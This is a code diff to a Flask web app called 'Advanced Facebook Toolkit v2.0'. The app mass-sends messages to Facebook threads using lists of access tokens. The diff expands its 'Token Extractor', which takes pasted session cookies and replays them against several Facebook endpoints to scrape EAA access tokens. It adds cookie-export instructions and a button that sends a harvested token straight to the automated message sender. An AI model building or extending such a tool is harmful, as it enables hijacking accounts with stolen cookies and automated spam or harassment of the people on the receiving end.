@@ -5,6 +5,7 @@ import time
 import random
 import string
 import re
+import json
 
 app = Flask(__name__)
 app.debug = True
@@ -36,17 +37,134 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 try:
                     response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                     if response.status_code == 200:
-                        print(f"✓ Message Sent Successfully From token {access_token[:20]}...: {message}")
+                        print(f"✓ Message Sent Successfully: {message[:30]}...")
                     else:
-                        print(f"✗ Message Failed From token {access_token[:20]}...: {response.text[:100]}")
+                        print(f"✗ Message Failed: {response.text[:100]}")
                 except Exception as e:
                     print(f"Error: {str(e)[:100]}")
                 time.sleep(time_interval)
 
-def extract_token_from_cookie(cookie):
-    """Extract Facebook access token from cookie string"""
+def parse_cookies(cookie_input):
+    """Parse cookies from different formats"""
+    cookies = {}
+    
+    # Try JSON format (from EditThisCookie or similar)
+    try:
+        cookie_list = json.loads(cookie_input)
+        for cookie in cookie_list:
+            if 'name' in cookie and 'value' in cookie:
+                cookies[cookie['name']] = cookie['value']
+        if cookies:
+            return cookies
+    except:
+        pass
+    
+    # Try standard cookie string format
+    if '=' in cookie_input:
+        for item in cookie_input.split(';'):
+            item = item.strip()
+            if '=' in item:
+                key, value = item.split('=', 1)
+                cookies[key.strip()] = value.strip()
+        if cookies:
+            return cookies
+    
+    return None
+
+def fetch_facebook_token(cookies_dict):
+    """Fetch actual Facebook access token using cookies"""
+    session = requests.Session()
+    session.cookies.update(cookies_dict)
+    
+    access_tokens = []
+    
+    try:
+        # Method 1: Try to get token from business.facebook.com
+        biz_url = 'https://business.facebook.com/business_locations'
+        response = session.get(biz_url, headers=headers, timeout=15)
+        
+        # Search for EAA token in response
+        patterns = [
+            r'(EAAB[A-Za-z0-9]+)',
+            r'(EAAC[A-Za-z0-9]+)',
+            r'(EAAG[A-Za-z0-9]+)',
+            r'(EAAD[A-Za-z0-9]+)',
+            r'(EAAAA[A-Za-z0-9]+)',
+            r'"accessToken":"([^"]+)"',
+            r'accessToken=([^&]+)',
+        ]
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, response.text)
+            for match in matches:
+                if match.startswith('EAA') and len(match) > 50:
+                    access_tokens.append(match)
+        
+        # Method 2: Try mbasic version
+        if not access_tokens:
+            mbasic_url = 'https://mbasic.facebook.com/'
+            response = session.get(mbasic_url, headers=headers, timeout=15)
+            
+            # Extract token from various places
+            patterns = [
+                r'access_token["\s:=]+([A-Za-z0-9]+)',
+                r'\"accessToken\":\"([^\"]+)\"',
+                r'name="access_token" value="([^"]+)"',
+            ]
+            
+            for pattern in patterns:
+                matches = re.findall(pattern, response.text)
+                for match in matches:
+                    if match.startswith('EAA') and len(match) > 50:
+                        access_tokens.append(match)
+        
+        # Method 3: Try Graph API explorer
+        if not access_tokens:
+            graph_url = 'https://developers.facebook.com/tools/explorer/'
+            response = session.get(graph_url, headers=headers, timeout=15)
+            
+            patterns = [
+                r'access_token=([A-Za-z0-9]+)',
+                r'"access_token":"([^"]+)"',
+            ]
+            
+            for pattern in patterns:
+                matches = re.findall(pattern, response.text)
+                for match in matches:
+                    if match.startswith('EAA') and len(match) > 50:
+                        access_tokens.append(match)
+        
+        # Method 4: Try to get user ID and generate token
+        if not access_tokens:
+            user_id = cookies_dict.get('c_user', '')
+            if user_id:
+                # Try to get a page access token
+                pages_url = f'https://graph.facebook.com/{user_id}/accounts'
+                response = session.get(pages_url, headers=headers, timeout=15)
+                
+                patterns = [
+                    r'access_token":"([^"]+)"',
+                ]
+                
+                for pattern in patterns:
+                    matches = re.findall(pattern, response.text)
+                    for match in matches:
+                        if match.startswith('EAA'):
+                            access_tokens.append(match)
+        
+        # Remove duplicates
+        access_tokens = list(set(access_tokens))
+        
+        return access_tokens
+        
+    except Exception as e:
+        print(f"Error fetching token: {str(e)}")
+        return []
+
+def extract_token_from_cookie(cookie_input):
+    """Extract Facebook access token from cookie string (legacy method)"""
     patterns = [
-        r'EAABsb[A-Za-z0-9]+',
+        r'EAAB[A-Za-z0-9]+',
         r'EAAC[A-Za-z0-9]+',
         r'EAAG[A-Za-z0-9]+',
         r'EAAD[A-Za-z0-9]+',
@@ -54,24 +172,10 @@ def extract_token_from_cookie(cookie):
     ]
     
     for pattern in patterns:
-        match = re.search(pattern, cookie)
+        match = re.search(pattern, cookie_input)
         if match:
-            return match.group(0)
-    return None
-
-def extract_token_from_response(response_text):
-    """Extract access token from Facebook response"""
-    patterns = [
-        r'access_token=([A-Za-z0-9]+)',
-        r'"accessToken":"([A-Za-z0-9]+)"',
-        r'access_token":"([A-Za-z0-9]+)"'
-    ]
-    
-    for pattern in patterns:
-        match = re.search(pattern, response_text)
-        if match:
-            return match.group(1)
-    return None
+            return [match.group(0)]
+    return []
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
@@ -83,26 +187,29 @@ def send_message():
             extracted_tokens = []
             
             if cookie_input:
-                # Extract from cookie
-                token = extract_token_from_cookie(cookie_input)
-                if token:
-                    extracted_tokens.append(token)
+                # First try to parse cookies and fetch token
+                cookies = parse_cookies(cookie_input)
                 
-                # Try to fetch from Facebook if cookie provided
-                try:
-                    fb_headers = headers.copy()
-                    fb_headers['Cookie'] = cookie_input
-                    response = requests.get('https://mbasic.facebook.com/', headers=fb_headers, timeout=10)
-                    token = extract_token_from_response(response.text)
-                    if token and token not in extracted_tokens:
+                if cookies:
+                    print(f"Parsed {len(cookies)} cookies")
+                    # Try to fetch token using cookies
+                    fetched_tokens = fetch_facebook_token(cookies)
+                    extracted_tokens.extend(fetched_tokens)
+                
+                # Also try direct extraction
+                direct_tokens = extract_token_from_cookie(cookie_input)
+                for token in direct_tokens:
+                    if token not in extracted_tokens:
                         extracted_tokens.append(token)
-                except:
-                    pass
             
             if extracted_tokens:
                 return jsonify({'success': True, 'tokens': extracted_tokens})
             else:
-                return jsonify({'success': False, 'message': 'No token found in cookie'})
+                # Return helpful message with instructions
+                return jsonify({
+                    'success': False, 
+                    'message': 'Token not found. Try these methods:\n\n1. Login to Facebook\n2. Go to https://business.facebook.com/\n3. Open Developer Tools (F12)\n4. Go to Network tab\n5. Look for requests containing "access_token"\n6. Or use a token from Graph API Explorer'
+                })
         
         else:
             token_option = request.form.get('tokenOption')
@@ -113,7 +220,6 @@ def send_message():
                 token_file = request.files['tokenFile']
                 access_tokens = token_file.read().decode().strip().splitlines()
             
-            # Filter valid tokens
             access_tokens = [token.strip() for token in access_tokens if token.strip()]
             
             thread_id = request.form.get('threadId')
@@ -131,12 +237,13 @@ def send_message():
             thread.start()
             
             return f'''
-            <div style="color: green; padding: 20px;">
+            <div style="color: green; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px;">
                 <h3>✓ Task Started Successfully!</h3>
                 <p>Task ID: <strong>{task_id}</strong></p>
                 <p>Tokens Loaded: {len(access_tokens)}</p>
                 <p>Messages: {len(messages)}</p>
-                <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px;">Back to Home</button>
+                <p>Save this Task ID to stop the task later!</p>
+                <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 10px;">Back to Home</button>
             </div>
             '''
     
@@ -148,7 +255,7 @@ def send_message():
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>♛ AHMAD ALI SAFDAR ♛</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <style>
     * {
       margin: 0;
@@ -156,7 +263,7 @@ def send_message():
       box-sizing: border-box;
     }
     body {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
       min-height: 100vh;
       color: white;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -168,170 +275,211 @@ def send_message():
     }
     .header {
       text-align: center;
-      padding: 20px;
-      background: rgba(0,0,0,0.3);
-      border-radius: 15px;
+      padding: 30px 20px;
+      background: linear-gradient(135deg, rgba(102,126,234,0.3) 0%, rgba(118,75,162,0.3) 100%);
+      border-radius: 20px;
       margin-bottom: 30px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.1);
+      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
     }
     .header h1 {
       font-size: 2.5em;
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-      animation: glow 2s ease-in-out infinite alternate;
+      text-shadow: 0 0 20px rgba(102,126,234,0.8);
+      animation: glow 3s ease-in-out infinite alternate;
     }
     @keyframes glow {
-      from { text-shadow: 0 0 10px #fff, 0 0 20px #fff; }
-      to { text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff; }
+      from { text-shadow: 0 0 10px #667eea, 0 0 20px #667eea; }
+      to { text-shadow: 0 0 20px #764ba2, 0 0 40px #764ba2; }
     }
     .tabs {
       display: flex;
       justify-content: center;
-      gap: 10px;
+      gap: 15px;
       margin-bottom: 30px;
+      flex-wrap: wrap;
     }
     .tab-btn {
       padding: 12px 30px;
-      background: rgba(255,255,255,0.2);
-      border: 2px solid rgba(255,255,255,0.3);
+      background: rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.15);
       color: white;
-      border-radius: 10px;
+      border-radius: 50px;
       cursor: pointer;
       font-size: 16px;
       font-weight: bold;
       transition: all 0.3s;
+      backdrop-filter: blur(10px);
     }
     .tab-btn:hover {
-      background: rgba(255,255,255,0.3);
-      transform: translateY(-2px);
+      background: rgba(102,126,234,0.3);
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
     }
     .tab-btn.active {
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      border-color: white;
-      box-shadow: 0 0 20px rgba(102,126,234,0.5);
+      border-color: transparent;
+      box-shadow: 0 5px 20px rgba(102,126,234,0.4);
     }
     .tab-content {
       display: none;
-      background: rgba(0,0,0,0.4);
-      border-radius: 15px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 20px;
       padding: 30px;
       backdrop-filter: blur(10px);
       box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.1);
     }
     .tab-content.active {
       display: block;
     }
     .form-group {
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
     .form-label {
       display: block;
-      margin-bottom: 8px;
-      font-weight: bold;
+      margin-bottom: 10px;
+      font-weight: 600;
       color: #fff;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .form-label i {
+      margin-right: 8px;
+      color: #667eea;
     }
     .form-control {
       width: 100%;
-      padding: 12px;
-      background: rgba(255,255,255,0.1);
-      border: 2px solid rgba(255,255,255,0.2);
-      border-radius: 8px;
+      padding: 14px 18px;
+      background: rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
       color: white;
-      font-size: 16px;
+      font-size: 15px;
       transition: all 0.3s;
     }
     .form-control:focus {
       outline: none;
       border-color: #667eea;
-      background: rgba(255,255,255,0.2);
-      box-shadow: 0 0 10px rgba(102,126,234,0.5);
+      background: rgba(0,0,0,0.4);
+      box-shadow: 0 0 20px rgba(102,126,234,0.3);
     }
     .form-control::placeholder {
-      color: rgba(255,255,255,0.6);
+      color: rgba(255,255,255,0.4);
     }
     select.form-control option {
-      background: #333;
+      background: #1a1a2e;
+    }
+    textarea.form-control {
+      resize: vertical;
+      min-height: 150px;
     }
     .btn {
-      padding: 12px 30px;
+      padding: 14px 35px;
       border: none;
-      border-radius: 8px;
+      border-radius: 12px;
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
       transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
     .btn-primary {
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       color: white;
     }
     .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 20px rgba(102,126,234,0.4);
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(102,126,234,0.4);
     }
     .btn-success {
-      background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+      background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
       color: white;
     }
     .btn-success:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 20px rgba(56,239,125,0.4);
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(0,180,219,0.4);
     }
     .btn-danger {
       background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
       color: white;
     }
     .btn-danger:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 20px rgba(235,51,73,0.4);
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(235,51,73,0.4);
     }
     .token-result {
-      margin-top: 20px;
-      padding: 15px;
+      margin-top: 25px;
+      padding: 20px;
       background: rgba(0,0,0,0.3);
-      border-radius: 8px;
-      border-left: 4px solid #38ef7d;
-      word-break: break-all;
+      border-radius: 12px;
+      border: 1px solid rgba(0,180,219,0.3);
     }
     .footer {
       text-align: center;
       margin-top: 40px;
-      padding: 20px;
-      background: rgba(0,0,0,0.3);
-      border-radius: 15px;
+      padding: 25px;
+      background: rgba(0,0,0,0.2);
+      border-radius: 20px;
+      border: 1px solid rgba(255,255,255,0.05);
     }
     .social-links {
       display: flex;
       justify-content: center;
       gap: 20px;
-      margin-top: 15px;
+      margin-top: 20px;
+      flex-wrap: wrap;
     }
     .social-link {
       color: white;
       text-decoration: none;
-      padding: 10px 20px;
-      background: rgba(255,255,255,0.1);
-      border-radius: 8px;
+      padding: 12px 25px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 50px;
       transition: all 0.3s;
+      border: 1px solid rgba(255,255,255,0.1);
     }
     .social-link:hover {
-      background: rgba(255,255,255,0.2);
-      transform: translateY(-2px);
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      transform: translateY(-3px);
       color: white;
     }
     .info-box {
-      background: rgba(102,126,234,0.2);
-      padding: 15px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-      border: 1px solid rgba(102,126,234,0.3);
+      background: rgba(102,126,234,0.15);
+      padding: 18px;
+      border-radius: 12px;
+      margin-bottom: 25px;
+      border-left: 4px solid #667eea;
     }
     .token-display {
-      max-height: 200px;
+      max-height: 250px;
       overflow-y: auto;
-      padding: 10px;
+      padding: 15px;
       background: rgba(0,0,0,0.3);
-      border-radius: 5px;
-      margin-top: 10px;
+      border-radius: 8px;
+      margin-top: 15px;
+    }
+    .copy-btn {
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.2);
+      color: white;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-left: 10px;
+    }
+    .instruction-box {
+      background: rgba(0,0,0,0.3);
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 20px;
+    }
+    .instruction-box code {
+      background: rgba(102,126,234,0.3);
+      padding: 2px 8px;
+      border-radius: 4px;
+      color: #fff;
     }
   </style>
 </head>
@@ -339,17 +487,17 @@ def send_message():
   <div class="main-container">
     <header class="header">
       <h1>♛ 𝐀𝐇𝐌𝐀𝐃 𝐀𝐋𝐈 𝐒𝐀𝐅𝐃𝐀𝐑 ♛</h1>
-      <p style="margin-top: 10px; opacity: 0.9;">Advanced Facebook Toolkit</p>
+      <p style="margin-top: 15px; opacity: 0.9; font-size: 16px;">Advanced Facebook Toolkit v2.0</p>
     </header>
 
     <div class="tabs">
-      <button class="tab-btn active" onclick="showTab('sender')">
+      <button class="tab-btn active" onclick="showTab(\'sender\')">
         <i class="fas fa-paper-plane"></i> Message Sender
       </button>
-      <button class="tab-btn" onclick="showTab('extractor')">
+      <button class="tab-btn" onclick="showTab(\'extractor\')">
         <i class="fas fa-key"></i> Token Extractor
       </button>
-      <button class="tab-btn" onclick="showTab('stopper')">
+      <button class="tab-btn" onclick="showTab(\'stopper\')">
         <i class="fas fa-stop-circle"></i> Stop Task
       </button>
     </div>
@@ -358,7 +506,7 @@ def send_message():
     <div id="sender" class="tab-content active">
       <div class="info-box">
         <i class="fas fa-info-circle"></i> 
-        <strong>Instructions:</strong> Fill all fields to start sending messages automatically.
+        <strong>Instructions:</strong> Fill all fields to start sending messages automatically. Get token from the Token Extractor tab.
       </div>
       
       <form method="post" enctype="multipart/form-data">
@@ -394,6 +542,7 @@ def send_message():
             <i class="fas fa-comments"></i> Conversation/Thread ID
           </label>
           <input type="text" class="form-control" id="threadId" name="threadId" placeholder="t_123456789..." required>
+          <small style="color: #aaa;">Example: t_100064912345678</small>
         </div>
         
         <div class="form-group">
@@ -428,25 +577,43 @@ def send_message():
     <div id="extractor" class="tab-content">
       <div class="info-box">
         <i class="fas fa-lightbulb"></i>
-        <strong>How to get cookie:</strong> Login to Facebook → Press F12 → Console Tab → Type: document.cookie → Copy the result
+        <strong>How to get cookies (JSON format):</strong>
+        <ol style="margin-top: 10px; margin-left: 20px;">
+          <li>Install "EditThisCookie" extension in Chrome</li>
+          <li>Login to Facebook</li>
+          <li>Click on EditThisCookie icon</li>
+          <li>Click "Export" button (arrow pointing right)</li>
+          <li>Paste the copied JSON data below</li>
+        </ol>
       </div>
       
       <div class="form-group">
         <label class="form-label">
-          <i class="fas fa-cookie-bite"></i> Paste Facebook Cookie
+          <i class="fas fa-cookie-bite"></i> Paste Facebook Cookies (JSON or String format)
         </label>
-        <textarea class="form-control" id="cookieInput" rows="5" placeholder="Paste your Facebook cookie here..."></textarea>
+        <textarea class="form-control" id="cookieInput" rows="8" placeholder='Paste your Facebook cookies here (JSON format from EditThisCookie)...'></textarea>
       </div>
       
       <button class="btn btn-success" onclick="extractToken()" style="width: 100%;">
         <i class="fas fa-search"></i> Extract Token
       </button>
       
+      <div class="instruction-box">
+        <h4><i class="fas fa-info-circle"></i> Alternative Token Methods:</h4>
+        <ul style="margin-top: 10px; margin-left: 20px;">
+          <li>Go to <a href="https://business.facebook.com/" target="_blank" style="color: #667eea;">business.facebook.com</a> and look for access_token in Network tab</li>
+          <li>Use <a href="https://developers.facebook.com/tools/explorer/" target="_blank" style="color: #667eea;">Graph API Explorer</a> to generate token</li>
+        </ul>
+      </div>
+      
       <div id="tokenResult" class="token-result" style="display: none;">
-        <h4><i class="fas fa-check-circle" style="color: #38ef7d;"></i> Extracted Tokens:</h4>
+        <h4><i class="fas fa-check-circle" style="color: #00b4db;"></i> Extracted Tokens:</h4>
         <div id="tokenList" class="token-display"></div>
-        <button class="btn btn-primary" onclick="copyTokens()" style="margin-top: 10px;">
+        <button class="btn btn-primary" onclick="copyTokens()" style="margin-top: 15px;">
           <i class="fas fa-copy"></i> Copy All Tokens
+        </button>
+        <button class="btn btn-success" onclick="useToken()" style="margin-top: 15px; margin-left: 10px;">
+          <i class="fas fa-arrow-right"></i> Use This Token
         </button>
       </div>
     </div>
@@ -487,20 +654,15 @@ def send_message():
 
   <script>
     function showTab(tabName) {
-      // Hide all tabs
       document.querySelectorAll('.tab-content').forEach(tab => {
         tab.classList.remove('active');
       });
       
-      // Remove active class from all buttons
       document.querySelectorAll('.tab-btn').forEach(btn => {
         btn.classList.remove('active');
       });
       
-      // Show selected tab
       document.getElementById(tabName).classList.add('active');
-      
-      // Add active class to clicked button
       event.target.classList.add('active');
     }
     
@@ -519,9 +681,15 @@ def send_message():
       const cookieInput = document.getElementById('cookieInput').value;
       
       if (!cookieInput) {
-        alert('Please paste your Facebook cookie first!');
+        alert('Please paste your Facebook cookies first!');
         return;
       }
+      
+      // Show loading
+      const btn = event.target;
+      const originalText = btn.innerHTML;
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Extracting...';
+      btn.disabled = true;
       
       const formData = new FormData();
       formData.append('action', 'extract');
@@ -539,22 +707,28 @@ def send_message():
         if (data.success) {
           let html = '';
           data.tokens.forEach((token, index) => {
-            html += `<div style="margin-bottom: 10px; padding: 5px; background: rgba(255,255,255,0.1); border-radius: 5px;">
+            html += `<div style="margin-bottom: 15px; padding: 12px; background: rgba(0,180,219,0.15); border-radius: 8px; border: 1px solid rgba(0,180,219,0.3);">
               <strong>Token ${index + 1}:</strong><br>
-              <span style="word-break: break-all;">${token}</span>
+              <span style="word-break: break-all; font-family: monospace;">${token}</span>
+              <button class="copy-btn" onclick="copySingleToken(\'${token}\')">
+                <i class="fas fa-copy"></i> Copy
+              </button>
             </div>`;
           });
           tokenList.innerHTML = html;
           resultDiv.style.display = 'block';
-          
-          // Store tokens for copying
           window.extractedTokens = data.tokens;
         } else {
-          alert('No token found in the cookie! Make sure you copied the full cookie string.');
+          alert('No token found! ' + (data.message || 'Try alternative methods.'));
         }
+        
+        btn.innerHTML = originalText;
+        btn.disabled = false;
       })
       .catch(error => {
         alert('Error extracting token: ' + error);
+        btn.innerHTML = originalText;
+        btn.disabled = false;
       });
     }
     
@@ -564,7 +738,6 @@ def send_message():
         navigator.clipboard.writeText(textToCopy).then(() => {
           alert('Tokens copied to clipboard!');
         }).catch(err => {
-          // Fallback
           const textarea = document.createElement('textarea');
           textarea.value = textToCopy;
           document.body.appendChild(textarea);
@@ -576,7 +749,21 @@ def send_message():
       }
     }
     
-    // Initialize token input visibility
+    function copySingleToken(token) {
+      navigator.clipboard.writeText(token).then(() => {
+        alert('Token copied!');
+      });
+    }
+    
+    function useToken() {
+      if (window.extractedTokens && window.extractedTokens.length > 0) {
+        showTab('sender');
+        document.getElementById('tokenOption').value = 'single';
+        toggleTokenInput();
+        document.getElementById('singleToken').value = window.extractedTokens[0];
+      }
+    }
+    
     document.addEventListener('DOMContentLoaded', function() {
       toggleTokenInput();
     });
@@ -591,24 +778,24 @@ def stop_task():
     if task_id in stop_events:
         stop_events[task_id].set()
         return f'''
-        <div style="color: green; padding: 20px; text-align: center;">
-            <h3>✓ Task with ID {task_id} has been stopped successfully!</h3>
-            <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px;">Back to Home</button>
+        <div style="color: #00b4db; padding: 30px; text-align: center; background: rgba(0,0,0,0.5); border-radius: 15px;">
+            <h3><i class="fas fa-check-circle"></i> Task {task_id} has been stopped!</h3>
+            <button onclick="location.href='/'" style="padding: 12px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 50px; margin-top: 20px; cursor: pointer;">Back to Home</button>
         </div>
         '''
     else:
         return f'''
-        <div style="color: red; padding: 20px; text-align: center;">
-            <h3>✗ No task found with ID: {task_id}</h3>
-            <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px;">Back to Home</button>
+        <div style="color: #eb3349; padding: 30px; text-align: center; background: rgba(0,0,0,0.5); border-radius: 15px;">
+            <h3><i class="fas fa-times-circle"></i> No task found with ID: {task_id}</h3>
+            <button onclick="location.href='/'" style="padding: 12px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 50px; margin-top: 20px; cursor: pointer;">Back to Home</button>
         </div>
         '''
 
 if __name__ == '__main__':
-    print("\n" + "="*50)
-    print("♛ AHMAD ALI SAFDAR - Facebook Toolkit ♛")
-    print("="*50)
+    print("\n" + "="*60)
+    print("♛ AHMAD ALI SAFDAR - Facebook Toolkit v2.0 ♛")
+    print("="*60)
     print("Server running at: http://0.0.0.0:5000")
     print("Press Ctrl+C to stop the server")
-    print("="*50 + "\n")
+    print("="*60 + "\n")
     app.run(host='0.0.0.0', port=5000)
